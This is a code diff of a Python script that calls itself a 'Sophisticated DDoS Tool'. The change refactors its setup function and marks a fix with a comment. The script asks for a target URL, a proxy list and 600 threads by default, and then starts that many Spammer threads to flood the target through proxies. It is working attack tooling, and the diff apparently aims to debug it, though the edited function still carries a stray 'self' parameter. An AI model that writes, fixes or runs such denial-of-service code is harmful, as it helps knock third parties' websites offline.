@@ -8319,41 +8319,41 @@ def check_url(url):
         url = "https://" + url
     return url
 
-    def setup(self):
-        global N
-        N = 0
-        while True:
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Fore.YELLOW + "Sophisticated DDoS Tool")
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Style.RESET_ALL)
-            url = input('> Enter the target URL to DoS: ')
-            url = self.check_url(url)
-            try:
-                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
-                response = urllib.request.urlopen(req)
-                break
-            except:
-                print('> Could not open the specified URL.')
+def setup(self):
+    global N
+    N = 0
+    while True:
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Fore.YELLOW + "Sophisticated DDoS Tool")
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Style.RESET_ALL)
+        url = input('> Enter the target URL to DoS: ')
+        url = check_url(url)  # FIXED: Now correctly using the global function
+        try:
+            req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
+            response = urllib.request.urlopen(req)
+            break
+        except:
+            print('> Could not open the specified URL.')
 
-        while True:
-            try:
-                proxy_file = input('> Enter the path to the proxy list: ')
-                with open(proxy_file, 'r') as in_file:
-                    proxy_list = [i.strip() for i in in_file.readlines()]
-                break
-            except:
-                print('Error reading the proxy list file.')
+    while True:
+        try:
+            proxy_file = input('> Enter the path to the proxy list: ')
+            with open(proxy_file, 'r') as in_file:
+                proxy_list = [i.strip() for i in in_file.readlines()]
+            break
+        except:
+            print('Error reading the proxy list file.')
 
-        while True:
-            try:
-                num_threads = int(input('> Enter the number of threads [600]: ') or '600')
-                break
-            except:
-                print('Invalid input. Please enter a number.')
+    while True:
+        try:
+            num_threads = int(input('> Enter the number of threads [600]: ') or '600')
+            break
+        except:
+            print('Invalid input. Please enter a number.')
 
-        for i in range(num_threads):
-            Spammer(url, i + 1, proxy_list).start()
+    for i in range(num_threads):
+        Spammer(url, i + 1, proxy_list).start()
 
 if __name__ == '__main__':
     b = MainLoop()
